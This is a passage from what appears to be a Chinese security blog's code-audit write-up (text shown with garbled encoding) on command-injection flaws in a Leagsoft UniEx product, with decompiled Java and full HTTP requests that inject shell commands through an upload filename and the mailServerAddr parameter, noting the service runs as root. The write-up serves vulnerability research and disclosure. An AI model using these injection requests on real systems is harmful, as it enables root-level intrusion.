</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> param;
</span></span><span style=display:flex><span>    }
</span></span></code></pre></div><p><code>request</code> è¢«ä¼ å…¥äº†<code>ServletFileUpload</code>ï¼Œçœ‹æ¥æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„æ•°æ®åŒ…ã€‚</p><p>æ„é€ ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„æ•°æ®åŒ…å‘é€è¿‡å»è°ƒè¯•çœ‹çœ‹ï¼š</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-cpp data-lang=cpp><span style=display:flex><span>POST <span style=color:#f92672>/</span>UniEx<span style=color:#f92672>/</span>fileTrackMarkMessage<span style=color:#f92672>/</span>getUploadFileID.htm HTTP<span style=color:#f92672>/</span><span style=color:#ae81ff>1.1</span>
</span></span><span style=display:flex><span>Host: <span style=color:#ae81ff>192.168.117.100</span>
</span></span><span style=display:flex><span>Content<span style=color:#f92672>-</span>Length: <span style=color:#ae81ff>181</span>
</span></span><span style=display:flex><span>Cache<span style=color:#f92672>-</span>Control: max<span style=color:#f92672>-</span>age<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>Sec<span style=color:#f92672>-</span>Ch<span style=color:#f92672>-</span>Ua: <span style=color:#e6db74>&#34; Not A;Brand&#34;</span>;v<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;99&#34;</span>, <span style=color:#e6db74>&#34;Chromium&#34;</span>;v<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;96&#34;</span>
</span></span><span style=display:flex><span>Sec<span style=color:#f92672>-</span>Ch<span style=color:#f92672>-</span>Ua<span style=color:#f92672>-</span>Mobile: <span style=color:#f92672>?</span><span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>Sec<span style=color:#f92672>-</span>Ch<span style=color:#f92672>-</span>Ua<span style=color:#f92672>-</span>Platform: <span style=color:#e6db74>&#34;macOS&#34;</span>
</span></span><span style=display:flex><span>Upgrade<span style=color:#f92672>-</span>Insecure<span style=color:#f92672>-</span>Requests: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Cookie: JSESSIONID<span style=color:#f92672>=</span><span style=color:#ae81ff>5</span>D3B2F3A86C3F73FC8FA267D3D5603D5;
</span></span><span style=display:flex><span>Referer: https:<span style=color:#75715e>//192.168.49.100/UniEx/login.jsp
</span></span></span><span style=display:flex><span>Content<span style=color:#f92672>-</span>Type: multipart<span style=color:#f92672>/</span>form<span style=color:#f92672>-</span>data; boundary<span style=color:#f92672>=----</span>WebKitFormBoundarymo440JkALdwNUIKs
</span></span><span style=display:flex><span>User<span style=color:#f92672>-</span>Agent: Mozilla<span style=color:#f92672>/</span><span style=color:#ae81ff>5.0</span> (Windows NT <span style=color:#ae81ff>10.0</span>; Win64; x64) AppleWebKit<span style=color:#f92672>/</span><span style=color:#ae81ff>537.36</span> (KHTML, like Gecko) Chrome<span style=color:#f92672>/</span><span style=color:#ae81ff>96.0.4664.93</span> Safari<span style=color:#f92672>/</span><span style=color:#ae81ff>537.36</span>
</span></span><span style=display:flex><span>Accept: text<span style=color:#f92672>/</span>html,application<span style=color:#f92672>/</span>xhtml<span style=color:#f92672>+</span>xml,application<span style=color:#f92672>/</span>xml;q<span style=color:#f92672>=</span><span style=color:#ae81ff>0.9</span>,image<span style=color:#f92672>/</span>avif,image<span style=color:#f92672>/</span>webp,image<span style=color:#f92672>/</span>apng,<span style=color:#960050;background-color:#1e0010>*/</span><span style=color:#f92672>*</span>;q<span style=color:#f92672>=</span><span style=color:#ae81ff>0.8</span>,application<span style=color:#f92672>/</span><span style=color:#66d9ef>signed</span><span style=color:#f92672>-</span>exchange;v<span style=color:#f92672>=</span>b3;q<span style=color:#f92672>=</span><span style=color:#ae81ff>0.9</span>
</span></span><span style=display:flex><span>Sec<span style=color:#f92672>-</span>Fetch<span style=color:#f92672>-</span>Site: cross<span style=color:#f92672>-</span>site
</span></span><span style=display:flex><span>Sec<span style=color:#f92672>-</span>Fetch<span style=color:#f92672>-</span>Mode: navigate
</span></span><span style=display:flex><span>Sec<span style=color:#f92672>-</span>Fetch<span style=color:#f92672>-</span>User: <span style=color:#f92672>?</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Sec<span style=color:#f92672>-</span>Fetch<span style=color:#f92672>-</span>Dest: document
</span></span><span style=display:flex><span>Accept<span style=color:#f92672>-</span>Encoding: gzip, deflate
</span></span><span style=display:flex><span>Accept<span style=color:#f92672>-</span>Language: zh<span style=color:#f92672>-</span>CN,zh;q<span style=color:#f92672>=</span><span style=color:#ae81ff>0.9</span>
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>------</span>WebKitFormBoundarymo440JkALdwNUIKs
</span></span><span style=display:flex><span>Content<span style=color:#f92672>-</span>Disposition: form<span style=color:#f92672>-</span>data; name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;file&#34;</span>; filename<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;1.png&#34;</span>
</span></span><span style=display:flex><span>Content<span style=color:#f92672>-</span>Type: image<span style=color:#f92672>/</span>png
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>123</span>
</span></span><span style=display:flex><span><span style=color:#f92672>------</span>WebKitFormBoundarymo440JkALdwNUIKs<span style=color:#f92672>--</span>
</span></span></code></pre></div><p>æ­¤æ—¶å±€éƒ¨å˜é‡çš„å€¼ï¼š</p><p><a href=https://images.payloads.online/2024-07-29-6cdfbf06144d922718628f163f388c612fc310451acfd8da9b039989ec3b07fe.png data-fancybox=gallery data-caption=18><img src=https://images.payloads.online/2024-07-29-6cdfbf06144d922718628f163f388c612fc310451acfd8da9b039989ec3b07fe.png alt=18></a></p><p>æˆ‘å‘ç°æ–‡ä»¶åè¢«å¸¦å…¥äº†<code>/bin/sh -c</code> æ„å‘³ç€æ–‡ä»¶åä¹Ÿå¯ä»¥ä½œä¸ºå‘½ä»¤æ‰§è¡Œï¼Œç”±äºå‰é¢æœ‰è¿›è¡Œæ–‡ä»¶æ‰©å±•åçš„è·å–è§£æï¼Œè¿™ä¸ªæ–¹æ³•ä¼šå–æ–‡ä»¶åçš„æœ€åä¸€ä¸ª<code>.</code> ä½œä¸ºåˆ†å‰²ï¼ŒæŠŠæ‰©å±•åå–å¾—åæ‹¼æ¥åœ¨æœ€åé¢ï¼Œæœ€å¥½çš„å‘½ä»¤æ³¨å…¥ç‚¹æ˜¯æ–‡ä»¶æ‰©å±•åï¼Œæœ€ç»ˆæˆ‘çš„payloadå¦‚ä¸‹ï¼š</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>file.<span style=color:#e6db74>`</span>touch<span style=color:#e6db74>${</span>IFS<span style=color:#e6db74>}</span>222222<span style=color:#e6db74>`</span>
</span></span></code></pre></div><p><a href=https://images.payloads.online/2024-07-29-0d3b7e5111031fac69abbe36548f69d4b03e41557e60107e919f41005f3966d5.png data-fancybox=gallery data-caption=19><img src=https://images.payloads.online/2024-07-29-0d3b7e5111031fac69abbe36548f69d4b03e41557e60107e919f41005f3966d5.png alt=19></a></p><p>åˆ©ç”¨````å’Œ<code>${IFS}</code>æ›¿ä»£ç©ºæ ¼ åœ¨shellä¸­çš„ç‰¹ç‚¹ï¼Œå¯ä»¥è¾¾åˆ°ä»»æ„å‘½ä»¤æ‰§è¡Œçš„ç›®çš„ï¼Œæˆ‘è¿˜å‘ç°å®ƒçš„javaæœåŠ¡æ˜¯ä»¥rootç”¨æˆ·å¯åŠ¨çš„ï¼Œæ„å‘³ç€è·å–è¿™ä¸ªå‘½ä»¤æ‰§è¡Œçš„æƒé™å°±æ˜¯æœ€é«˜æƒé™ã€‚</p><p><a href=https://images.payloads.online/2024-07-29-5a44f4361c4d69a355c43805a908033c99d86f80539148f1fb3898d111b3deae.png data-fancybox=gallery data-caption=20><img src=https://images.payloads.online/2024-07-29-5a44f4361c4d69a355c43805a908033c99d86f80539148f1fb3898d111b3deae.png alt=20></a></p><h3 id=åå°å‘½ä»¤æ‰§è¡ŒäºŒ>åå°å‘½ä»¤æ‰§è¡ŒäºŒ</h3><p><code>com.leagsoft.uex.sysparam.controller.NoticeConfigController.class</code> ä¸­çš„<code>testNoticeEmailAction</code>æ–¹æ³•å­˜åœ¨å‘½ä»¤æ³¨å…¥ï¼Œåœ¨è°ƒç”¨<code>JavaShellUtil.executeCommand</code>æ–¹æ³•æ—¶ï¼Œå°†ç”¨æˆ·è¾“å…¥å¸¦å…¥äº†bashè„šæœ¬åé¢ï¼Œä½†<code>LeagUtil.filterCmdParams</code>å¯¹è¾“å…¥çš„å€¼è¿›è¡Œäº†è¿‡æ»¤æ›¿æ¢ï¼Œä¸è¿‡å› ä¸ºå‚æ•°æ²¡æœ‰æ”¾å…¥å•å¼•å·ä¸­ï¼Œå¯ä»¥ä½¿ç”¨<code>;</code> å¯¹å‰é¢çš„è„šæœ¬è¿›è¡Œé—­åˆï¼Œä»è€Œç»•è¿‡é™åˆ¶æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>testNoticeEmailAction</span>(HttpServletRequest request, HttpServletResponse response) <span style=color:#66d9ef>throws</span> IOException {
</span></span><span style=display:flex><span>        Map<span style=color:#f92672>&lt;</span>String, String<span style=color:#f92672>&gt;</span> emailMap <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap();
</span></span><span style=display:flex><span>        Map<span style=color:#f92672>&lt;</span>String, String<span style=color:#f92672>[]&gt;</span> map <span style=color:#f92672>=</span> request.<span style=color:#a6e22e>getParameterMap</span>();
</span></span><span style=display:flex><span>        Set<span style=color:#f92672>&lt;</span>Entry<span style=color:#f92672>&lt;</span>String, String<span style=color:#f92672>[]&gt;&gt;</span> set <span style=color:#f92672>=</span> map.<span style=color:#a6e22e>entrySet</span>();
</span></span><span style=display:flex><span>        Iterator it <span style=color:#f92672>=</span> set.<span style=color:#a6e22e>iterator</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>while</span>(it.<span style=color:#a6e22e>hasNext</span>()) {
</span></span><span style=display:flex><span>            Entry<span style=color:#f92672>&lt;</span>String, String<span style=color:#f92672>[]&gt;</span> entry <span style=color:#f92672>=</span> (Entry)it.<span style=color:#a6e22e>next</span>();
</span></span><span style=display:flex><span>            emailMap.<span style=color:#a6e22e>put</span>(entry.<span style=color:#a6e22e>getKey</span>(), ((String<span style=color:#f92672>[]</span>)entry.<span style=color:#a6e22e>getValue</span>())<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        String random <span style=color:#f92672>=</span> (String)emailMap.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;random&#34;</span>);
</span></span><span style=display:flex><span>        String mailPwd <span style=color:#f92672>=</span> RC4.<span style=color:#a6e22e>RC4DecodeForJS</span>((String)emailMap.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;mailSendPwd&#34;</span>), random);
</span></span><span style=display:flex><span>        emailMap.<span style=color:#a6e22e>put</span>(<span style=color:#e6db74>&#34;mailSendPwd&#34;</span>, mailPwd);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>            JavaShellUtil.<span style=color:#a6e22e>executeCommand</span>(<span style=color:#e6db74>&#34;/home/leagsoft/SafeDataExchange/Bin/dataex_iptables.sh &#34;</span> <span style=color:#f92672>+</span> LeagUtil.<span style=color:#a6e22e>filterCmdParams</span>((String)emailMap.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;mailServerAddr&#34;</span>)) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34; &#34;</span> <span style=color:#f92672>+</span> LeagUtil.<span style=color:#a6e22e>filterCmdParams</span>((String)emailMap.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;mailServerPort&#34;</span>)), <span style=color:#66d9ef>false</span>);
</span></span><span style=display:flex><span>            log.<span style=color:#a6e22e>info</span>(<span style=color:#e6db74>&#34;excute shell command : /home/leagsoft/SafeDataExchange/Bin/dataex_iptables.sh {} {}&#34;</span>, emailMap.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;mailServerPort&#34;</span>), emailMap.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;mailServerPort&#34;</span>));
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (IOException var13) {
</span></span><span style=display:flex><span>            log.<span style=color:#a6e22e>error</span>(<span style=color:#e6db74>&#34;excute /home/leagsoft/SafeDataExchange/Bin/dataex_iptables.sh error&#34;</span>, var13);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>.....
</span></span><span style=display:flex><span><span style=color:#75715e>// LeagUtil.filterCmdParams</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> String <span style=color:#a6e22e>filterCmdParams</span>(String cmdParams) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (StringUtils.<span style=color:#a6e22e>isEmpty</span>(cmdParams)) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> cmdParams;
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>            String afterParams <span style=color:#f92672>=</span> cmdParams.<span style=color:#a6e22e>replaceAll</span>(<span style=color:#e6db74>&#34;`&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>StringUtils.<span style=color:#a6e22e>isEmpty</span>(afterParams) <span style=color:#f92672>&amp;&amp;</span> afterParams.<span style=color:#a6e22e>contains</span>(<span style=color:#e6db74>&#34;$(&#34;</span>)) {
</span></span><span style=display:flex><span>                afterParams <span style=color:#f92672>=</span> afterParams.<span style=color:#a6e22e>replaceAll</span>(<span style=color:#e6db74>&#34;\\$&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>);
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            log.<span style=color:#a6e22e>info</span>(<span style=color:#e6db74>&#34;before cmdParams:{},after filter cmdParams:{}&#34;</span>, cmdParams, afterParams);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> afterParams;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span></code></pre></div><p>å‘é€æ•°æ®åŒ…ï¼š</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span>POST <span style=color:#f92672>/</span>UniEx<span style=color:#f92672>/</span>noticeConfig<span style=color:#f92672>/</span>testNoticeEmailAction.<span style=color:#a6e22e>htm</span> HTTP<span style=color:#f92672>/</span>1.<span style=color:#a6e22e>1</span>
</span></span><span style=display:flex><span>Host: 192.<span style=color:#a6e22e>168</span>.<span style=color:#a6e22e>117</span>.<span style=color:#a6e22e>100</span>
</span></span><span style=display:flex><span>Cache<span style=color:#f92672>-</span>Control: max<span style=color:#f92672>-</span>age<span style=color:#f92672>=</span>0
</span></span><span style=display:flex><span>Cookie: JSESSIONID<span style=color:#f92672>=</span>F9DA84D287041E1F8E09234CAA3EAB58;
</span></span><span style=display:flex><span>Sec<span style=color:#f92672>-</span>Ch<span style=color:#f92672>-</span>Ua: <span style=color:#e6db74>&#34; Not A;Brand&#34;</span>;v<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;99&#34;</span>, <span style=color:#e6db74>&#34;Chromium&#34;</span>;v<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;96&#34;</span>
</span></span><span style=display:flex><span>Sec<span style=color:#f92672>-</span>Ch<span style=color:#f92672>-</span>Ua<span style=color:#f92672>-</span>Mobile: <span style=color:#f92672>?</span>0
</span></span><span style=display:flex><span>Sec<span style=color:#f92672>-</span>Ch<span style=color:#f92672>-</span>Ua<span style=color:#f92672>-</span>Platform: <span style=color:#e6db74>&#34;macOS&#34;</span>
</span></span><span style=display:flex><span>Upgrade<span style=color:#f92672>-</span>Insecure<span style=color:#f92672>-</span>Requests: 1
</span></span><span style=display:flex><span>Origin: <span style=color:#66d9ef>null</span>
</span></span><span style=display:flex><span>User<span style=color:#f92672>-</span>Agent: Mozilla<span style=color:#f92672>/</span>5.<span style=color:#a6e22e>0</span> (Windows NT 10.<span style=color:#a6e22e>0</span>; Win64; x64) AppleWebKit<span style=color:#f92672>/</span>537.<span style=color:#a6e22e>36</span> (KHTML, like Gecko) Chrome<span style=color:#f92672>/</span>96.<span style=color:#a6e22e>0</span>.<span style=color:#a6e22e>4664</span>.<span style=color:#a6e22e>93</span> Safari<span style=color:#f92672>/</span>537.<span style=color:#a6e22e>36</span>
</span></span><span style=display:flex><span>Referer: https:<span style=color:#75715e>//192.168.117.100/UniEx/login.jsp</span>
</span></span><span style=display:flex><span>Accept: text<span style=color:#f92672>/</span>html,application<span style=color:#f92672>/</span>xhtml<span style=color:#f92672>+</span>xml,application<span style=color:#f92672>/</span>xml;q<span style=color:#f92672>=</span>0.<span style=color:#a6e22e>9</span>,image<span style=color:#f92672>/</span>avif,image<span style=color:#f92672>/</span>webp,image<span style=color:#f92672>/</span>apng,<span style=color:#f92672>*/*</span>;q<span style=color:#f92672>=</span>0.<span style=color:#a6e22e>8</span>,application<span style=color:#f92672>/</span>signed<span style=color:#f92672>-</span>exchange;v<span style=color:#f92672>=</span>b3;q<span style=color:#f92672>=</span>0.<span style=color:#a6e22e>9</span>
</span></span><span style=display:flex><span>Sec<span style=color:#f92672>-</span>Fetch<span style=color:#f92672>-</span>Site: cross<span style=color:#f92672>-</span>site
</span></span><span style=display:flex><span>Sec<span style=color:#f92672>-</span>Fetch<span style=color:#f92672>-</span>Mode: navigate
</span></span><span style=display:flex><span>Sec<span style=color:#f92672>-</span>Fetch<span style=color:#f92672>-</span>User: <span style=color:#f92672>?</span>1
</span></span><span style=display:flex><span>Sec<span style=color:#f92672>-</span>Fetch<span style=color:#f92672>-</span>Dest: document
</span></span><span style=display:flex><span>Accept<span style=color:#f92672>-</span>Encoding: gzip, deflate
</span></span><span style=display:flex><span>Accept<span style=color:#f92672>-</span>Language: zh<span style=color:#f92672>-</span>CN,zh;q<span style=color:#f92672>=</span>0.<span style=color:#a6e22e>9</span>
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Content<span style=color:#f92672>-</span>Type: application<span style=color:#f92672>/</span>x<span style=color:#f92672>-</span>www<span style=color:#f92672>-</span>form<span style=color:#f92672>-</span>urlencoded
</span></span><span style=display:flex><span>Content<span style=color:#f92672>-</span>Length: 78
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>random<span style=color:#f92672>=</span>123<span style=color:#f92672>&amp;</span>mailSendPwd<span style=color:#f92672>=</span>123<span style=color:#f92672>&amp;</span>mailServerAddr<span style=color:#f92672>=</span>;touch<span style=color:#f92672>%</span>20<span style=color:#f92672>/</span>tmp<span style=color:#f92672>/</span>222<span style=color:#f92672>&amp;</span>mailServerPort<span style=color:#f92672>=</span>123
</span></span></code></pre></div><h3 id=æ€è€ƒ>æ€è€ƒ</h3><p>è¿™æ¬¾äº§å“ä½¿ç”¨äº†javassistçš„åŠ¨æ€æ‰§è¡ŒæŠ€æœ¯ï¼Œä½†æ˜¯javaå§‹ç»ˆè¿˜æ˜¯javaï¼Œæˆ‘ä»¬åªéœ€è¦hookæˆ–è€…é’ˆå¯¹å®ƒæœ€ä¸Šå±‚çš„ä»£ç è¿›è¡Œç ”ç©¶å³å¯ï¼Œäºæ˜¯æˆ‘æ ¹æ®æœ¬æ¬¡æ¼æ´æŒ–æ˜ï¼Œç¼–å†™äº†ä¸€ä¸ªå·¥å…·ï¼š<a href=https://github.com/Rvn0xsy/DumperAnalyze>Rvn0xsy/DumperAnalyze: é€šè¿‡JavaAgentä¸JavassistæŠ€æœ¯å¯¹JVMåŠ è½½çš„ç±»å¯¹è±¡è¿›è¡ŒåŠ¨æ€æ’æ¡©ï¼Œå¯ä»¥åšä¸€äº›ç ´è§£ã€åŠ å¯†éªŒè¯çš„ç»•è¿‡ç­‰æ“ä½œ (github.com)</a></p><p>é€šè¿‡JavaAgentä¸JavassistæŠ€æœ¯å¯¹JVMåŠ è½½çš„ç±»å¯¹è±¡è¿›è¡ŒåŠ¨æ€æ’æ¡©ï¼Œå¯ä»¥åšä¸€äº›ç ´è§£ã€åŠ å¯†éªŒè¯çš„ç»•è¿‡ç­‰æ“ä½œã€‚</p></section><footer class="mt-12 flex flex-wrap"><a class="mb-1.5 rounded-lg bg-black/[3%] px-5 py-1 no-underline hover:bg-black/[6%] ltr:mr-1.5 rtl:ml-1.5 dark:bg-white/[8%] dark:hover:bg-white/[12%]" href=https://payloads.online/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1>ä»£ç å®¡è®¡</a></footer><nav class="mt-24 flex overflow-hidden rounded-xl bg-black/[3%] text-lg leading-[1.2]! *:flex *:w-1/2 *:items-center *:p-5 *:font-medium *:no-underline dark:bg-white/[8%] [&>*:hover]:bg-black/[2%] dark:[&>*:hover]:bg-white/[3%]"><a class="ltr:pr-3 rtl:pl-3" href=https://payloads.online/archivers/2023-10-31/good-habits/><span class="ltr:mr-1.5 rtl:ml-1.5">â†</span><span>éœ€è¦ä¿æŒçš„å‡ ä¸ªå¥½ä¹ æƒ¯</span></a><a class="justify-end pl-3 ltr:ml-auto rtl:mr-auto" href=https://payloads.online/archivers/2023-09-18/phishing/><span>é‚®ä»¶é’“é±¼ä¸T1218.001</span><span class="ltr:ml-1.5 rtl:mr-1.5">â†’</span></a></nav><div class="giscus mt-24"></div><script src=https://giscus.app/client.js data-repo=Rvn0xsy/rvn0xsy.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY=" data-category=General data-category-id=DIC_kwDOF-pTTM4CRDk_ data-mapping=title data-strict=1 data-reactions-enabled=0 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></article></main><script src=/js/fancybox.umd.js></script><script>Fancybox.bind('[data-fancybox="gallery"]',{})</script><script src=/js/pangu.min.js></script><script>document.addEventListener("DOMContentLoaded",()=>{pangu.spacingElementByClassName("prose")})</script><footer class="mx-auto flex h-[4.5rem] max-w-(--w) items-center px-8 text-xs tracking-wider uppercase opacity-60"><div class=mr-auto>å€¾æ—‹ All rights reserved</div><a class="link mx-6" href=https://gohugo.io/ rel=noopener target=_blank>powered by hugoï¸ï¸</a>ï¸</footer></body></html>